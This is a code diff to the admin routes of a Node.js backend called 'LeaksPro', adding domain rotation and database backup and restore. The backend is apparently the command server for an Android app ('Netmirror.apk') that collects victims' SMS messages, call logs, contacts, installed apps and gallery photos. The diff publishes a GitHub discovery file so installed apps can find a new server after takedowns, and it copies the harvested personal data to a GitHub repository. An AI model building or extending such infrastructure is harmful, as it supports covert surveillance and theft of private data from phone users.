@@ -1022,10 +1022,299 @@ router.post('/admin-theme', adminAuth, (req, res) => {
   }
 });
 
-module.exports = router;
-
 // ═══════════════════════════════════════
-//  Admin Device Management (LeaksProAdmin app tracking)
+//  Domain Management & Disaster Recovery
+// ═══════════════════════════════════════
+
+const GITHUB_REPO = 'vernapark/Leakspro-backend';
+const GITHUB_DISCOVERY_FILE = 'domain.json';
+const GITHUB_BACKUP_FILE = 'backups/db-backup.json';
+
+/**
+ * Push a file to GitHub repo via the Contents API.
+ * Creates or updates the file at the given path.
+ */
+async function pushToGitHub(filePath, content, commitMessage) {
+  const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
+  if (!token?.value) throw new Error('GitHub token not configured');
+
+  const apiUrl = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
+  const headers = {
+    'Authorization': `token ${token.value}`,
+    'Accept': 'application/vnd.github.v3+json',
+    'Content-Type': 'application/json',
+    'User-Agent': 'LeaksPro-Backend'
+  };
+
+  // Check if file exists (to get its SHA for update)
+  let sha = null;
+  try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 10000);
+    const existing = await fetch(apiUrl, { headers, signal: controller.signal });
+    clearTimeout(timeout);
+    if (existing.ok) {
+      const data = await existing.json();
+      sha = data.sha;
+    }
+  } catch (_) {}
+
+  const body = {
+    message: commitMessage,
+    content: Buffer.from(content).toString('base64'),
+  };
+  if (sha) body.sha = sha;
+
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 30000);
+  const res = await fetch(apiUrl, {
+    method: 'PUT',
+    headers,
+    body: JSON.stringify(body),
+    signal: controller.signal
+  });
+  clearTimeout(timeout);
+
+  if (!res.ok) {
+    const err = await res.json().catch(() => ({}));
+    throw new Error(`GitHub API ${res.status}: ${err.message || 'unknown error'}`);
+  }
+  return await res.json();
+}
+
+// GET /api/admin/system-config — Get domain, GitHub, backup status
+router.get('/system-config', adminAuth, (req, res) => {
+  try {
+    const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
+    const githubToken = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
+    const lastBackup = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_github_backup'").get();
+    const lastDomainPush = db.prepare("SELECT value FROM admin_settings WHERE key = 'last_domain_push'").get();
+    const autoBackup = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
+
+    res.json({
+      server_domain: domain?.value || '',
+      current_origin: `${req.protocol}://${req.get('host')}`,
+      github_token_set: !!githubToken?.value,
+      github_repo: GITHUB_REPO,
+      last_github_backup: lastBackup?.value || null,
+      last_domain_push: lastDomainPush?.value || null,
+      auto_backup_enabled: autoBackup?.value === '1',
+      discovery_url: `https://raw.githubusercontent.com/${GITHUB_REPO}/main/${GITHUB_DISCOVERY_FILE}`,
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// PUT /api/admin/system-config/github-token — Save GitHub personal access token
+router.put('/system-config/github-token', adminAuth, (req, res) => {
+  try {
+    const { token } = req.body;
+    if (!token) return res.status(400).json({ error: 'Token required' });
+
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('github_token', ?)").run(token);
+    res.json({ success: true, message: 'GitHub token saved' });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// PUT /api/admin/system-config/domain — Change the active server domain
+router.put('/system-config/domain', adminAuth, async (req, res) => {
+  try {
+    let { domain } = req.body;
+    if (!domain) return res.status(400).json({ error: 'Domain URL required' });
+
+    // Normalize: ensure https://, remove trailing slash
+    domain = domain.trim();
+    if (!domain.startsWith('http')) domain = 'https://' + domain;
+    domain = domain.replace(/\/+$/, '');
+
+    // Save to database
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('server_domain', ?)").run(domain);
+
+    // Push domain.json to GitHub so apps can discover the new server
+    const discoveryPayload = JSON.stringify({
+      domain: domain,
+      updated_at: new Date().toISOString(),
+      api_base: `${domain}/api`,
+      admin_panel: `${domain}/admin`,
+      download_apk: `${domain}/downloadapp/Netmirror.apk`,
+    }, null, 2);
+
+    let githubPushed = false;
+    try {
+      await pushToGitHub(
+        GITHUB_DISCOVERY_FILE,
+        discoveryPayload,
+        `Update server domain to ${domain}`
+      );
+      githubPushed = true;
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_domain_push', ?)").run(new Date().toISOString());
+    } catch (e) {
+      console.warn('[Domain] GitHub push failed:', e.message);
+    }
+
+    console.log(`[Domain] Changed to: ${domain} | GitHub: ${githubPushed ? 'pushed' : 'failed'}`);
+
+    res.json({
+      success: true,
+      domain,
+      github_pushed: githubPushed,
+      message: githubPushed
+        ? `Domain changed to ${domain} — discovery file pushed to GitHub`
+        : `Domain saved locally but GitHub push failed. Set a valid GitHub token first.`
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/system-config/backup — Create a database backup and push to GitHub
+router.post('/system-config/backup', adminAuth, async (req, res) => {
+  try {
+    // Export all critical data
+    const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
+                     'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
+                     'signed_apks', 'watch_history', 'comments'];
+    
+    const backup = {
+      version: 2,
+      created_at: new Date().toISOString(),
+      server_domain: db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get()?.value || '',
+      tables: {}
+    };
+
+    for (const table of tables) {
+      try {
+        const rows = db.prepare(`SELECT * FROM ${table}`).all();
+        backup.tables[table] = rows;
+      } catch (_) {
+        // Table might not exist yet
+        backup.tables[table] = [];
+      }
+    }
+
+    const backupJson = JSON.stringify(backup);
+    const backupSize = Buffer.byteLength(backupJson);
+
+    // Push to GitHub
+    let githubPushed = false;
+    try {
+      await pushToGitHub(
+        GITHUB_BACKUP_FILE,
+        backupJson,
+        `Database backup — ${new Date().toISOString()} — ${Object.keys(backup.tables).map(t => `${t}:${backup.tables[t].length}`).join(', ')}`
+      );
+      githubPushed = true;
+      db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
+    } catch (e) {
+      console.warn('[Backup] GitHub push failed:', e.message);
+    }
+
+    // Also save locally
+    const localBackupPath = require('path').join(__dirname, '..', 'data', 'db-backup.json');
+    fs.writeFileSync(localBackupPath, backupJson);
+
+    const totalRows = Object.values(backup.tables).reduce((s, t) => s + t.length, 0);
+
+    console.log(`[Backup] Created: ${totalRows} rows across ${Object.keys(backup.tables).length} tables (${(backupSize/1024).toFixed(1)} KB) | GitHub: ${githubPushed}`);
+
+    res.json({
+      success: true,
+      github_pushed: githubPushed,
+      backup_size: backupSize,
+      total_rows: totalRows,
+      tables: Object.fromEntries(Object.entries(backup.tables).map(([k, v]) => [k, v.length])),
+      message: githubPushed
+        ? 'Backup created and pushed to GitHub'
+        : 'Backup saved locally but GitHub push failed. Check your token.'
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /api/admin/system-config/restore — Restore database from GitHub backup
+router.post('/system-config/restore', adminAuth, async (req, res) => {
+  try {
+    const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
+    if (!token?.value) return res.status(400).json({ error: 'GitHub token not configured' });
+
+    // Fetch backup from GitHub
+    const apiUrl = `https://api.github.com/repos/${GITHUB_REPO}/contents/${GITHUB_BACKUP_FILE}`;
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 30000);
+    const ghRes = await fetch(apiUrl, {
+      headers: {
+        'Authorization': `token ${token.value}`,
+        'Accept': 'application/vnd.github.v3+json',
+        'User-Agent': 'LeaksPro-Backend'
+      },
+      signal: controller.signal
+    });
+    clearTimeout(timeout);
+
+    if (!ghRes.ok) return res.status(404).json({ error: 'No backup found on GitHub' });
+
+    const ghData = await ghRes.json();
+    const backupJson = Buffer.from(ghData.content, 'base64').toString('utf8');
+    const backup = JSON.parse(backupJson);
+
+    if (!backup.version || !backup.tables) {
+      return res.status(400).json({ error: 'Invalid backup format' });
+    }
+
+    // Restore each table
+    const restored = {};
+    for (const [table, rows] of Object.entries(backup.tables)) {
+      if (!rows.length) { restored[table] = 0; continue; }
+
+      try {
+        const cols = Object.keys(rows[0]);
+        const placeholders = cols.map(() => '?').join(', ');
+        const stmt = db.prepare(`INSERT OR REPLACE INTO ${table} (${cols.join(', ')}) VALUES (${placeholders})`);
+
+        let count = 0;
+        for (const row of rows) {
+          try {
+            stmt.run(...cols.map(c => row[c] ?? null));
+            count++;
+          } catch (_) {}
+        }
+        restored[table] = count;
+      } catch (e) {
+        restored[table] = `error: ${e.message}`;
+      }
+    }
+
+    const totalRestored = Object.values(restored).filter(v => typeof v === 'number').reduce((s, v) => s + v, 0);
+    console.log(`[Restore] Restored ${totalRestored} rows from GitHub backup (${backup.created_at})`);
+
+    res.json({
+      success: true,
+      backup_date: backup.created_at,
+      total_restored: totalRestored,
+      tables: restored,
+      message: `Restored ${totalRestored} rows from backup dated ${backup.created_at}`
+    });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// PUT /api/admin/system-config/auto-backup — Toggle automatic daily backup
+router.put('/system-config/auto-backup', adminAuth, (req, res) => {
+  try {
+    const { enabled } = req.body;
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('auto_backup_enabled', ?)").run(enabled ? '1' : '0');
+    res.json({ success: true, auto_backup_enabled: !!enabled });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+module.exports = router;
 // ═══════════════════════════════════════
 
 /**
